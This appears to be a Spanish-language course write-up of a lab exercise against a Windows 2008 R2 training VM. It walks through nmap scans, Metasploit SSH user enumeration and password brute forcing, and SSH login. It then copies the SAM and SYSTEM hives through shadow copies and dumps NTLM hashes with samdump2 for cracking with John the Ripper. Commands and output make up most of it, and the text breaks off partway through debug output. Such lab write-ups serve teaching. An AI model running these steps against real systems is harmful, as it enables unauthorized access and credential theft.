---
title: S05 | C04 | WINDOWS 2008 R2 SP1 VULNERABILITIES - METASPLOIT 
date: 2024-10-03 00:00:00 -05:00
categories: [Vulnerabilities, Windows 2008, Metasploit]
tags: [metasploit]
---

## VULNERABILIDADES

Las **vulnerabilidades** son debilidades o fallas en un sistema, red, aplicación o proceso que pueden ser explotadas por amenazas para causar daño o acceder a información no autorizada. Estas pueden surgir de varios factores, incluyendo:

1. **Errores de software**: Fallos en el código que pueden ser aprovechados por atacantes.
2. **Configuraciones incorrectas**: Ajustes mal realizados que pueden dejar expuestos sistemas.
3. **Falta de actualizaciones**: No aplicar parches o actualizaciones de seguridad que protejan contra amenazas conocidas.
4. **Deficiencias en el diseño**: Estrategias o arquitecturas que no consideran la seguridad como una prioridad.

Las vulnerabilidades pueden clasificarse en diferentes categorías, como:

- **Vulnerabilidades de red**: Problemas en la infraestructura de red.
- **Vulnerabilidades de aplicación**: Fallos en el software que se ejecuta en los sistemas.
- **Vulnerabilidades físicas**: Riesgos relacionados con el acceso físico a los sistemas.

Identificar y gestionar vulnerabilidades es crucial para mantener la seguridad y proteger la información sensible.

## 1. Escaneo de la maquina target (maquina objetivo)

### Identificar la IP target (maquina objetivo)
- Ip
    ```bash
    ipconfig
    ```
    ![figura](/assets/images/2024-10-03-clase04-s05/ip_config.png)


- Nombre de dominio de la maquina objetivo

    ![figura1](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 151730.png)

- Datos obtenidos

    |IP target | Nombre de la maquina target|
    |10.0.2.4 | vagrant-2008R2| 


### Conexiones activas en la maquina target (maquina objetivo)

- Verificar la las conexiones activas en la maquina target con el comando **netstat**

    ```bash
    netstat
    ```

    ![figura1](/assets/images/2024-10-03-clase04-s05/netstat.png)


- Identificación de banderas que ofrece **netstat** (netstat -help)

    ```bash
    netstat -h
    ```
    ![figura1](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 152839.png)

- Direcciones o puertos activos en formato númerico (netstat -an) [puertos abiertos]

    ```bash
    netstat -an
    ```
    ![figura1](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 153059.png)

- Analizando los datos obtenidos por **netstat**
    La línea mostrada en la siguiente tabla indica que hay una conexión activa (ESTABLISHED) utilizando el protocolo TCP en la máquina (vagrant-2008R2) a través del puerto 49173. Esta información es útil para monitorear y diagnosticar el estado de las conexiones de red en un sistema.

    |Protocol | Local Adrress : port | Foreing Address | State |
    |TCP | 10.0.2.4| vagrant-2008R2:49173| ESTABLISHED |

## 2. Escaneo desde la attacker machine (maquina atacante)

- Identificar las direcciones IP configuradas en las interfaces de red del sistema. 

    ```ruby
    ip addr show
    ```

    - ip: Es el comando principal que se utiliza para gestionar la red.
    - addr: Indica que se está trabajando con direcciones IP.
    - show: Especifica que se desea mostrar la información.

    ![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 155152.png)


- Escaneo para obtener la versión de la columna, lo que es crucial para observar el servicio que se está ejecutando en un puerto específico de la máquina objetivo, permitiendo así identificar sus vulnerabilidades correspondientes a esa versión.

    ```ruby
    sudo nmap -sV -p- 10.0.2.4
    ```

    ![figura1](/assets/images/2024-10-03-clase04-s05/scan.png)

- Usar **nmap -sS** para descubrir hosts y servicios en una red.Indica a Nmap que realice un escaneo de tipo SYN. Este tipo de escaneo es muy utilizado porque es rápido y sigiloso.

    - Para el puerto 135

    ```ruby
    sudo nmap -sS -p- 135 10.0.2.4
    ```

    ![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 154730.png)


    - Para el puerto 445

    ```ruby
    sudo nmap -sS -p- 445 10.0.2.4
    ```

    ![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 155008.png)


### Ingresar a la maquina target mediante la maquina atacante
#### 1. Ingresar a Metasploit mediante el siguiente comando
```ruby
msfconsole -q
```
#### 2. Realizar la busqueda de los scripts asociados con los protocolo ssh
```ruby
msf6 > search ssh
```
#### 3. Realizar la busqueda de los scripts de ssh del listado de usuarios
```ruby
msf6 > search ssh enum
```
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 161106.png)

```ruby
msf6 auxiliary(scanner/ssh/ssh_enumusers)> search ssh enum
```

```ruby
msf6 auxiliary(scanner/ssh/ssh_enumusers)> show options
```

#### 4. Descargamos archivos txt de la web   y verificamos la lista **ls** y  su tamaño con  list **ls -lh**
- Listar los archivos en la carpeta Dowloads con **ls**, para luego verificar el tamaño del archivo descargado con **ls -lh**

```ruby
ls
```        

```ruby
ls -lh  CommonAdminBase64.txt top-usernames-shortlist.txt
```

![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 163906.png)

#### 5. Ennumerar usuarios desde Metasploit mediante Kali linux

- Acceder al módulo **ssh_enumusers**

```ruby
msf6 > use auxiliary/scanner/ssh_enumusers
```

- Asignar el archivo txt a **USER_FILE** de ssh_enumusers

```ruby
msf6 auxiliary(scanner/ssh/ssh_enumusers)> set USER_FILE /home/user/Downloads/CommonAdminBase64.txt
```
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 164150.png)

- Configurar el **RHOSTS** a la ip del target
```ruby
msf6 auxiliary(scanner/ssh/ssh_enumusers)> set RHOSTS 10.0.2.4
```
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 164323.png)        

- Ver el estado del VERBOSE, activar el estado del VERBOSE a true, para visualizar si el script se esta ejecutando.
```ruby
msf6 auxiliary(scanner/ssh/ssh_enumusers)> set VERBOSE
msf6 auxiliary(scanner/ssh/ssh_enumusers)> set VERBOSE true
```
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 164426.png)

- Ejecutar el script mediante **run**
```ruby
msf6 auxiliary(scanner/ssh/ssh_enumusers)> run
```
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 164456.png)

    - **[*]**: Este símbolo se utiliza para indicar información o mensajes de estado. Generalmente, se utiliza para mostrar que se está llevando a cabo una acción o que se está procesando información.
    - **[-]**: Este símbolo indica un resultado negativo. Significa que la búsqueda o prueba para ese usuario específico no tuvo éxito y que el usuario no fue encontrado en el servidor SSH.
    - **[+]**: Este símbolo indica un resultado positivo. Significa que la búsqueda o prueba para ese usuario fue exitosa y que el usuario fue encontrado en el servidor SSH.

- **PROCESO TOTAL DE ssh_enumusers**
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-11-01 004007.png)

#### 6. Crear archivo **usernames.txt** mediante **nano**
```ruby
(user@kali)-[~/Downloads]
$ nano usernames.txt
```
- Ingresar los usuarios encontrados anteriormente
    
```bash
Administrador
Guest
vagrant
```
- Verificar la creación del archivo **cat**

```ruby
(user@kali)-[~/Downloads]
$ cat usernames.txt
```

![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 170558.png)

#### 7. Ennumerar contraseñas de Metasploit mediante Kali linux

- Cargar el modulo **ssh_login** 

```ruby
msf6 > use auxiliary/scanner/ssh_login
```        

```ruby
msf6 auxiliary(scanner/ssh/ssh_login)> 
```
- Cargar el archivo de usuarios creado **usernames.txt**

```ruby
msf6 auxiliary(scanner/ssh/ssh_login)> set USER_FILE /home/user/Downloads/usernames.txt
```
```ruby
msf6 auxiliary(scanner/ssh/ssh_login)> show options
```

![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 174416.png) 

- Cargar el archivo de contraseñas descaragdos de la web **top-usernames-shortlist.txt**

```ruby
msf6 auxiliary(scanner/ssh/ssh_login)> set PASS_FILE /home/user/Downloads/top-usernames-shortlist.txt
```
```ruby
msf6 auxiliary(scanner/ssh/ssh_login)> show options
```
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-17 174739.png)        


- **PROCESO TOTAL DE ssh_login**
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-11-01 004143.png)
    

#### 8. Acceder al Shell de la maquina target
- Ingresar al shell de la maquina target de mediante el usuario encontrado y la ip target

```ruby
ssh vagrant@10.0.2.4 
vagrant@10.0.2.4's password:

help
```
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-31 190310.png)

- Verificar que la maquina target mediante **whoami**
```ruby
whoami
```
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-31 190508.png)

- Se verifica que la computadora es **vagrant-2008R2**
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-31 190618.png)

- Listar todos los usuarios de la maquina target
```ruby
net user 
```
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-11-01 004710_.png)

- Listar para usuario **vagrant**
```ruby
net user vagrant
```
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-10-31 192406.png)

- Listar para usuario **Administrator**
```ruby
net user Administrator
```
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-11-01 004747.png)


- Acceder a los archivos **SAM** y **SYSTEM**
```ruby
cd Windows s
cd System32
cd config
pwd
ls -lh SAM SYSTEM
```
![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-11-01 005551.png)

#### 9. Crear copias de seguridad de los datos con **Volume Shadow Copies**
- Descargar el script [vssown.vbs](https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs)
- Verificar las descarga del sript desde la carpeta **Downloads**
    ```ruby
    ls
    ```
    ![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-11-01 010416.png)

- Copiar el script **vssown.vbs** 
    ```ruby
    scp /home/user/Downloads/vssown.vbs vagrant@10.0.2.4:/cygdrive/c/Users/vagrant
    ```

    - **scp:** Este es el comando que se utiliza para realizar copias seguras de archivos entre máquinas a través de SSH (Secure Shell).
    - **/home/user/Downloads/vssown.vbs**: Ruta del archivo en la máquina local que se desea copiar. En este caso, el archivo es vssown.vbs y se encuentra en la carpeta Downloads del usuario en la máquina local.
    - **vagrant@10.0.2.4**: Esto especifica el usuario (vagrant) y la dirección IP del servidor remoto (10.0.2.4). Esto indica que el archivo se copiará a la cuenta del usuario vagrant en ese servidor.
    - **:/cygdrive/c/Users/vagrant**: Este es el destino en el servidor remoto donde se copiará el archivo. La ruta /cygdrive/c/Users/vagrant es típica en entornos de Cygwin o Git Bash en Windows, donde cygdrive representa las unidades de disco.

    ![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-11-01 011031.png)
    
- Verificar el archivo que se esta copiando

    ![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-11-01 011222.png)
    
- Analizar y ejecutar el script **vssown.vbs** 
    ```ruby
    cscript.exe vssown.vbs
    cscript.exe vssown.vbs/list
    cscript.exe vssown.vbs/status
    cscript.exe vssown.vbs/create [drive_letter] #directorio donde se crea
    ```
    ![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-11-01 011511.png)

- Copiar archivos de forma segura entre dispositivos.
    ```ruby
    scp vagrant@10.2.04:/cygdrive/c/ms/SAM /home/user/Downloads/SAM
    ```
    ![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-11-01 012838.png)
    
    ```ruby
    scp vagrant@10.2.04:/cygdrive/c/ms/SYSTEM /home/user/Downloads/SYSTEM
    ```
    ![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-11-01 013016.png)

- Verificar la obtención de las carpetas **SAM** y **SYSTEM**            
    ![figura](/assets/images/2024-10-03-clase04-s05/Captura de pantalla 2024-11-01 013038.png)


---------------------------------------------------

- Descargar archivos de usuarios 
    - https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz
    - https://github.com/kaonashi-passwords/Kaonashi/blob/master/wordlists/kaonashi14M.7z.torrent

- Comprobar la descarga de los carchios en Downloads

    ```bash
        ┌──(user㉿kali)-[~/Downloads]
        └─$ ls
        CommonAdminBase64.txt   diccionarios                'rockyou(1).txt.gz'            usernames.txt    windows_files
        SAM                    'kaonashi14M.7z(1).torrent'   rockyou.txt.gz                users.txt
        SYSTEM                  kaonashi14M.7z.torrent       search                        users_dump.txt
        bitacora.txt            passwords.txt                top-usernames-shortlist.txt   vssown.vbs
    ```                                                                                                                   
- Mover los archivos SAM y SYSTEM a una carpeta llamada windows_files

```bash
    ┌──(user㉿kali)-[~/Downloads]
    └─$ mv SAM SYSTEM windows_files 
```                                                          

- Verificar el movimiento de archivos
    ```bash
    ┌──(user㉿kali)-[~/Downloads]
    └─$ cd windows_files 

    ┌──(user㉿kali)-[~/Downloads/windows_files]
    └─$ ls
    SAM  SYSTEM
    ```           

- Ver el tamaño de los archivos  SAM y  SYSTEM                                                            

    ```bash
        ┌──(user㉿kali)-[~/Downloads/windows_files]
        └─$ ls -lh *                                                
        -rwxr-xr-x 1 user user 256K Oct 31 23:28 SAM
        -rwxr-xr-x 1 user user 7.5M Oct 31 23:30 SYSTEM         
    ```          
- Ver el contenido de SAM  SYSTEM

- comando samdump2
    ```bash
    ┌──(user㉿kali)-[~/Downloads/windows_files]
    └─$ samdump2 
    samdump2 3.0.0 by Objectif Securite (http://www.objectif-securite.ch)
    original author: ncuomo@studenti.unina.it

    Usage: samdump2 [OPTION]... SYSTEM_FILE SAM_FILE
    Retrieves syskey and extract hashes from Windows 2k/NT/XP/Vista SAM

    -d            enable debugging
    -h            display this information
    -o file       write output to file
                                       
    ```          

- Obtener contarseñas encriptadas

    ```bash
    ┌──(user㉿kali)-[~/Downloads/windows_files]
    └─$ samdump2 SYSTEM SAM             
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
    *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
    *disabled* sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
    leia_organa:1004:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::
    luke_skywalker:1005:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::
    han_solo:1006:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::
    artoo_detoo:1007:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
    c_three_pio:1008:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::
    ben_kenobi:1009:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
    darth_vader:1010:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::
    anakin_skywalker:1011:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
    jarjar_binks:1012:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::
    lando_calrissian:1013:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::
    boba_fett:1014:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
    jabba_hutt:1015:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::
    greedo:1016:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::
    chewbacca:1017:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
    kylo_ren:1018:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::
    ```      

                                                            
- Comparar el hash con las listas, para que alerte si hay alguna palabra que conincida con el hash

- John the Ripper
    - Iniciar
        ```bash
            ┌──(user㉿kali)-[~/Downloads/windows_files]
            └─$ john
            John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 SSE2 AC]
            Copyright (c) 1996-2021 by Solar Designer and others
            Homepage: https://www.openwall.com/john/

            Usage: john [OPTIONS] [PASSWORD-FILES]

            Use --help to list all available options.
        ```
    - Help
        ```bash
            ┌──(user㉿kali)-[~/Downloads/windows_files]
            └─$ john --help
            John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 SSE2 AC]
            Copyright (c) 1996-2021 by Solar Designer and others
            Homepage: https://www.openwall.com/john/

            Usage: john [OPTIONS] [PASSWORD-FILES]

            --help                     Print usage summary
            --single[=SECTION[,..]]    "Single crack" mode, using default or named rules
            --single=:rule[,..]        Same, using "immediate" rule(s)
            --single-seed=WORD[,WORD]  Add static seed word(s) for all salts in single mode
            --single-wordlist=FILE     *Short* wordlist with static seed words/morphemes
            --single-user-seed=FILE    Wordlist with seeds per username (user:password[s]
                                    format)
            --single-pair-max=N        Override max. number of word pairs generated (6)
            --no-single-pair           Disable single word pair generation
            --[no-]single-retest-guess Override config for SingleRetestGuess
            --wordlist[=FILE] --stdin  Wordlist mode, read words from FILE or stdin
                            --pipe   like --stdin, but bulk reads, and allows rules
            --rules[=SECTION[,..]]     Enable word mangling rules (for wordlist or PRINCE
                                    modes), using default or named rules
            --rules=:rule[;..]]        Same, using "immediate" rule(s)
            --rules-stack=SECTION[,..] Stacked rules, applied after regular rules or to
                                    modes that otherwise don't support rules
            --rules-stack=:rule[;..]   Same, using "immediate" rule(s)
            --rules-skip-nop           Skip any NOP ":" rules (you already ran w/o rules)
            --loopback[=FILE]          Like --wordlist, but extract words from a .pot file
            --mem-file-size=SIZE       Size threshold for wordlist preload (default 2048 MB)
            --dupe-suppression         Suppress all dupes in wordlist (and force preload)
            --incremental[=MODE]       "Incremental" mode [using section MODE]
            --incremental-charcount=N  Override CharCount for incremental mode
            --external=MODE            External mode or word filter
            --mask[=MASK]              Mask mode using MASK (or default from john.conf)
            --markov[=OPTIONS]         "Markov" mode (see doc/MARKOV)
            --mkv-stats=FILE           "Markov" stats file
            --prince[=FILE]            PRINCE mode, read words from FILE
            --prince-loopback[=FILE]   Fetch words from a .pot file
            --prince-elem-cnt-min=N    Minimum number of elements per chain (1)
            --prince-elem-cnt-max=[-]N Maximum number of elements per chain (negative N is
                                    relative to word length) (8)
            --prince-skip=N            Initial skip
            --prince-limit=N           Limit number of candidates generated
            --prince-wl-dist-len       Calculate length distribution from wordlist
            --prince-wl-max=N          Load only N words from input wordlist
            --prince-case-permute      Permute case of first letter
            --prince-mmap              Memory-map infile (not available with case permute)
            --prince-keyspace          Just show total keyspace that would be produced
                                    (disregarding skip and limit)
            --subsets[=CHARSET]        "Subsets" mode (see doc/SUBSETS)
            --subsets-required=N       The N first characters of "subsets" charset are
                                    the "required set"
            --subsets-min-diff=N       Minimum unique characters in subset
            --subsets-max-diff=[-]N    Maximum unique characters in subset (negative N is
                                    relative to word length)
            --subsets-prefer-short     Prefer shorter candidates over smaller subsets
            --subsets-prefer-small     Prefer smaller subsets over shorter candidates
            --make-charset=FILE        Make a charset, FILE will be overwritten
            --stdout[=LENGTH]          Just output candidate passwords [cut at LENGTH]
            --session=NAME             Give a new session the NAME
            --status[=NAME]            Print status of a session [called NAME]
            --restore[=NAME]           Restore an interrupted session [called NAME]
            --[no-]crack-status        Emit a status line whenever a password is cracked
            --progress-every=N         Emit a status line every N seconds
            --show[=left]              Show cracked passwords [if =left, then uncracked]
            --show=formats             Show information about hashes in a file (JSON)
            --show=invalid             Show lines that are not valid for selected format(s)
            --test[=TIME]              Run tests and benchmarks for TIME seconds each
                                    (if TIME is explicitly 0, test w/o benchmark)
            --stress-test[=TIME]       Loop self tests forever
            --test-full=LEVEL          Run more thorough self-tests
            --no-mask                  Used with --test for alternate benchmark w/o mask
            --skip-self-tests          Skip self tests
            --users=[-]LOGIN|UID[,..]  [Do not] load this (these) user(s) only
            --groups=[-]GID[,..]       Load users [not] of this (these) group(s) only
            --shells=[-]SHELL[,..]     Load users with[out] this (these) shell(s) only
            --salts=[-]COUNT[:MAX]     Load salts with[out] COUNT [to MAX] hashes, or
            --salts=#M[-N]             Load M [to N] most populated salts
            --costs=[-]C[:M][,...]     Load salts with[out] cost value Cn [to Mn]. For
                                    tunable cost parameters, see doc/OPTIONS
            --fork=N                   Fork N processes
            --node=MIN[-MAX]/TOTAL     This node's number range out of TOTAL count
            --save-memory=LEVEL        Enable memory saving, at LEVEL 1..3
            --log-stderr               Log to screen instead of file
            --verbosity=N              Change verbosity (1-5 or 6 for debug, default 3)
            --no-log                   Disables creation and writing to john.log file
            --bare-always-valid=Y      Treat bare hashes as valid (Y/N)
            --catch-up=NAME            Catch up with existing (paused) session NAME
            --config=FILE              Use FILE instead of john.conf or john.ini
            --encoding=NAME            Input encoding (eg. UTF-8, ISO-8859-1). See also
                                    doc/ENCODINGS.
            --input-encoding=NAME      Input encoding (alias for --encoding)
            --internal-codepage=NAME   Codepage used in rules/masks (see doc/ENCODINGS)
            --target-encoding=NAME     Output encoding (used by format)
            --force-tty                Set up terminal for reading keystrokes even if we're
                                    not the foreground process
            --field-separator-char=C   Use 'C' instead of the ':' in input and pot files
            --[no-]keep-guessing       Try finding plaintext collisions
            --list=WHAT                List capabilities, see --list=help or doc/OPTIONS
            --length=N                 Shortcut for --min-len=N --max-len=N
            --min-length=N             Request a minimum candidate length in bytes
            --max-length=N             Request a maximum candidate length in bytes
            --max-candidates=[-]N      Gracefully exit after this many candidates tried.
                                    (if negative, reset count on each crack)
            --max-run-time=[-]N        Gracefully exit after this many seconds (if negative,
                                    reset timer on each crack)
            --mkpc=N                   Request a lower max. keys per crypt
            --no-loader-dupecheck      Disable the dupe checking when loading hashes
            --pot=NAME                 Pot file to use
            --regen-lost-salts=N       Brute force unknown salts (see doc/OPTIONS)
            --reject-printable         Reject printable binaries
            --tune=HOW                 Tuning options (auto/report/N)
            --subformat=FORMAT         Pick a benchmark format for --format=crypt
            --format=[NAME|CLASS][,..] Force hash of type NAME. The supported formats can
                                    be seen with --list=formats and --list=subformats.
                                    See also doc/OPTIONS for more advanced selection of
                                    format(s), including using classes and wildcards.
        ```
    - lista formatos
        ```bash
        ──(user㉿kali)-[~/Downloads/windows_files]
        └─$ john --list=formats
        descrypt, bsdicrypt, md5crypt, md5crypt-long, bcrypt, scrypt, LM, AFS, 
        tripcode, AndroidBackup, adxcrypt, agilekeychain, aix-ssha1, aix-ssha256, 
        aix-ssha512, andOTP, ansible, argon2, as400-des, as400-ssha1, asa-md5, 
        AxCrypt, AzureAD, BestCrypt, BestCryptVE4, bfegg, Bitcoin, BitLocker, 
        bitshares, Bitwarden, BKS, Blackberry-ES10, WoWSRP, Blockchain, chap, 
        Clipperz, cloudkeychain, dynamic_n, cq, CRC32, cryptoSafe, sha1crypt, 
        sha256crypt, sha512crypt, Citrix_NS10, dahua, dashlane, diskcryptor, Django, 
        django-scrypt, dmd5, dmg, dominosec, dominosec8, DPAPImk, dragonfly3-32, 
        dragonfly3-64, dragonfly4-32, dragonfly4-64, Drupal7, eCryptfs, eigrp, 
        electrum, EncFS, enpass, EPI, EPiServer, ethereum, fde, Fortigate256, 
        Fortigate, FormSpring, FVDE, geli, gost, gpg, HAVAL-128-4, HAVAL-256-3, hdaa, 
        hMailServer, hsrp, IKE, ipb2, itunes-backup, iwork, KeePass, keychain, 
        keyring, keystore, known_hosts, krb4, krb5, krb5asrep, krb5pa-sha1, krb5tgs, 
        krb5-17, krb5-18, krb5-3, kwallet, lp, lpcli, leet, lotus5, lotus85, LUKS, 
        MD2, mdc2, MediaWiki, monero, money, MongoDB, scram, Mozilla, mscash, 
        mscash2, MSCHAPv2, mschapv2-naive, krb5pa-md5, mssql, mssql05, mssql12, 
        multibit, mysqlna, mysql-sha1, mysql, net-ah, nethalflm, netlm, netlmv2, 
        net-md5, netntlmv2, netntlm, netntlm-naive, net-sha1, nk, notes, md5ns, 
        nsec3, NT, o10glogon, o3logon, o5logon, ODF, Office, oldoffice, 
        OpenBSD-SoftRAID, openssl-enc, oracle, oracle11, Oracle12C, osc, ospf, 
        Padlock, Palshop, Panama, PBKDF2-HMAC-MD4, PBKDF2-HMAC-MD5, PBKDF2-HMAC-SHA1, 
        PBKDF2-HMAC-SHA256, PBKDF2-HMAC-SHA512, PDF, PEM, pfx, pgpdisk, pgpsda, 
        pgpwde, phpass, PHPS, PHPS2, pix-md5, PKZIP, po, postgres, PST, PuTTY, 
        pwsafe, qnx, RACF, RACF-KDFAES, radius, RAdmin, RAKP, rar, RAR5, Raw-SHA512, 
        Raw-Blake2, Raw-Keccak, Raw-Keccak-256, Raw-MD4, Raw-MD5, Raw-MD5u, Raw-SHA1, 
        Raw-SHA1-AxCrypt, Raw-SHA1-Linkedin, Raw-SHA224, Raw-SHA256, Raw-SHA3, 
        Raw-SHA384, restic, ripemd-128, ripemd-160, rsvp, RVARY, Siemens-S7, 
        Salted-SHA1, SSHA512, sapb, sapg, saph, sappse, securezip, 7z, Signal, SIP, 
        skein-256, skein-512, skey, SL3, Snefru-128, Snefru-256, LastPass, SNMP, 
        solarwinds, SSH, sspr, STRIP, SunMD5, SybaseASE, Sybase-PROP, tacacs-plus, 
        tcp-md5, telegram, tezos, Tiger, tc_aes_xts, tc_ripemd160, tc_ripemd160boot, 
        tc_sha512, tc_whirlpool, vdi, OpenVMS, vmx, VNC, vtp, wbb3, whirlpool, 
        whirlpool0, whirlpool1, wpapsk, wpapsk-pmk, xmpp-scram, xsha, xsha512, zed, 
        ZIP, ZipMonster, plaintext, has-160, HMAC-MD5, HMAC-SHA1, HMAC-SHA224, 
        HMAC-SHA256, HMAC-SHA384, HMAC-SHA512, dummy, crypt
        414 formats (149 dynamic formats shown as just "dynamic_n" here)
        ```

- Llevar a un archivo el sampeo de SYSTEM y SAM
    - Contenido de la memoria
        ```bash
        ┌──(user㉿kali)-[~/Downloads/windows_files]
        └─$ samdump2 SYSTEM SAM
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
        *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
        *disabled* sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
        sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
        leia_organa:1004:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::
        luke_skywalker:1005:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::
        han_solo:1006:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::
        artoo_detoo:1007:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
        c_three_pio:1008:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::
        ben_kenobi:1009:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
        darth_vader:1010:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::
        anakin_skywalker:1011:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
        jarjar_binks:1012:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::
        lando_calrissian:1013:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::
        boba_fett:1014:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
        jabba_hutt:1015:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::
        greedo:1016:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::
        chewbacca:1017:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
        kylo_ren:1018:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::
        ```

    - s
        ```bash
        ──(user㉿kali)-[~/Downloads/windows_files]
        └─$ samdump2 SYSTEM SAM -o user_win2008.txt -d
        Root Key : CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}
        Default ControlSet: 001
        ********* CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}\ControlSet001\Control\Lsa\JD *********
        n->classname_len = 16 b = 2c169c
        ********* CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}\ControlSet001\Control\Lsa\Skew1 *********
        n->classname_len = 16 b = 2c1824
        ********* CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}\ControlSet001\Control\Lsa\GBG *********
        n->classname_len = 16 b = 2c18d4
        ********* CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5}\ControlSet001\Control\Lsa\Data *********
        n->classname_len = 16 b = 3241dc
        Bootkey unsorted: ef1bc80b7b3fcddb4793e845b63d258e
        Root Key : CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}
        ******************** 1 ********************
        keyname = CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}\SAM\Domains\Account\Users\000001F4
        disabled = 0

        username len=13, off=188
        lm_hashoffset = 230, lm_size = 4
        nt_hashoffset = 234, nt_size = 14

